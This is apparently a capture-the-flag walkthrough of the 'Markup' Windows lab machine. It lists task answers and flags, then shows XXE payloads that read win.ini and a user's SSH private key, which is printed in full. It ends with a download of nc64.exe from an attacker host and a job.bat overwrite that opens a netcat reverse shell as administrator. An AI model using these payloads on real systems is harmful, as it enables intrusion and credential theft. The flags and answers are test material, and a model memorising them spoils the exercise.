# Tasks
- What version of Apache is running on the target's port 80?
	- 2.4.41
- What username:password combination logs in successfully?
	- admin:password
- What is the word at the top of the page that accepts user input?
	- order
- What XML version is used on the target?
	- 1.0
- What does the XXE / XEE attack acronym stand for?
	- XML External Entity
- What username can we find on the webpage's HTML code?
	- Daniel
- What is the file located in the Log-Management folder on the target?
	- job.bat
- What executable is mentioned in the file mentioned before?
	- wevtutil.exe
- User flag
	- 032d2fc8952a8c24e39c8f0ee9918ef7
- Root flag
	- f574a3e7650cebd8c39784299cb570f8


# Notes
- First, the classic rustscan:
```
rustscan --ulimit 5000 --addresses "10.129.21.62" --top -- -sC -sV
```
- We see an Apache server is being ran on this box, which might mean the existence of a website
- We are then greeted to a login page. With nothing else to do, we can try the various default credentials that one could have
- In this case, we actually had this work out in which we found admin:password to work
- We notice an Orders page where we can actually input text into it
- I wonder if there is more to it than it seems? 
- So, for that, let's go ahead and start up Burp Suite
- We are then able to capture the packet of what is sent when we fill out and send a Orders request
```
POST /process.php HTTP/1.1
Host: 10.129.21.62
Content-Length: 123
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: text/xml
Accept: */*
Origin: http://10.129.21.62
Referer: http://10.129.21.62/services.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=nsb438uisp5phambntg53llqbd
Connection: keep-alive

<?xml version = "1.0"?><order><quantity>33</quantity><item>Home Appliances</item><address>butthead street</address></order>
```
- We can actually see if modifying our XML can result in some sort of response
- Here's a test that we came up with
```
POST /process.php HTTP/1.1
Host: 10.129.21.62
Content-Length: 186
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: text/xml
Accept: */*
Origin: http://10.129.21.62
Referer: http://10.129.21.62/services.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=nsb438uisp5phambntg53llqbd
Connection: keep-alive

<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order><quantity>33</quantity><item>&test;</item><address>butthead street</address></order>
```
- And sure enough, we were able to get something back
```
HTTP/1.1 200 OK
Date: Wed, 07 Jan 2026 20:59:47 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 144
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Your order for ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[Ports]
COM1:=9600,n,8,1
 has been processed
```
- Also note bringing up is that within the source code for the Orders page, we are actually able to grab out a name of a developer for the app named Daniel
```
Modified by Daniel : UI-Fix-9092
```
- However, we don't have any sort of password or anything for him
- Since it's clear that Daniel is able to modify the website in someway, there could possibly be an SSH key or something in use.
- Let's modify our payload to read that out:
```
POST /process.php HTTP/1.1
Host: 10.129.22.9
Content-Length: 183
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: text/xml
Accept: */*
Origin: http://10.129.22.9
Referer: http://10.129.22.9/services.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hg3l4eu4eu0m4k6rhjjmtlgdb2
Connection: keep-alive

<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order><quantity>3</quantity><item>&test;</item><address>test</address></order>
```
- Bingo! We are able to grab what we need
```
HTTP/1.1 200 OK
Date: Thu, 08 Jan 2026 22:24:21 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 2636
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Your order for -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
 has been processed
```
- Now that we have a full private SSH key, we can use that to log into Daniel
```
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>

```
- Now that we are logged in as Daniel, we are able to get his user flag out:
```
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
 
daniel@MARKUP C:\Users\daniel>dir 
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\daniel

10/13/2021  03:43 PM    <DIR>          .
10/13/2021  03:43 PM    <DIR>          ..
03/05/2020  05:19 AM    <DIR>          .ssh        
03/05/2020  06:18 AM    <DIR>          Desktop     
04/21/2020  02:34 AM    <DIR>          Documents   
09/14/2018  11:12 PM    <DIR>          Downloads   
09/14/2018  11:12 PM    <DIR>          Favorites   
09/14/2018  11:12 PM    <DIR>          Links       
09/14/2018  11:12 PM    <DIR>          Music       
09/14/2018  11:12 PM    <DIR>          Pictures    
09/14/2018  11:12 PM    <DIR>          Saved Games 
09/14/2018  11:12 PM    <DIR>          Videos      
               0 File(s)              0 bytes      
              12 Dir(s)   7,393,533,952 bytes free 

daniel@MARKUP C:\Users\daniel>cd Desktop 

daniel@MARKUP C:\Users\daniel\Desktop>dir 
 Volume in drive C has no label. 
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\daniel\Desktop

03/05/2020  06:18 AM    <DIR>          .
03/05/2020  06:18 AM    <DIR>          ..
03/05/2020  06:18 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)   7,393,443,840 bytes free

daniel@MARKUP C:\Users\daniel\Desktop>type user.txt 
032d2fc8952a8c24e39c8f0ee9918ef7  
```
- We are asked about a file in the Log Management folder, so let's go ahead and navigate over there
- We are given a BAT file named job, and we are able to see what its function is:
```
daniel@MARKUP C:\Log-Management>type job.bat 
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```
- It appears to go ahead and clear out the Event Logs for us. However, to run this file, we need to be the Administrator to do so
- We can see that this is done using wevtutil.exe, which we can also confirm is running on the system
- Something we notice that is that we don't have access to the Administrator's stuff, but we do have access to the job.bat itself, so we can make some modifications to that to make it work
- We'll first go ahead and get that file over onto the target box
```
PS C:\Log-Management> wget http://10.10.15.113:8000/nc64.exe -outfile nc64.exe
PS C:\Log-Management> dir 


    Directory: C:\Log-Management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat
-a----         1/8/2026   2:36 PM          45272 nc64.exe


PS C:\Log-Management>
```
- Now with that done, we can get our listener up:
```
nc -lvnp 4444
```
- And then execute our payload (doing so on the regular command line and not PowerShell):
```
C:\Log-Management> echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.15.113 4444 > C:\Log-Management\job.bat
```
- We now just wait for the job to be re-ran and execute our payload to get dropped into a root shell
```
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.113] from (UNKNOWN) [10.129.24.245] 49678
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
markup\administrator

C:\Windows\system32>
```
- We are then able to get the root flag we are looking for!
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
f574a3e7650cebd8c39784299cb570f8
```
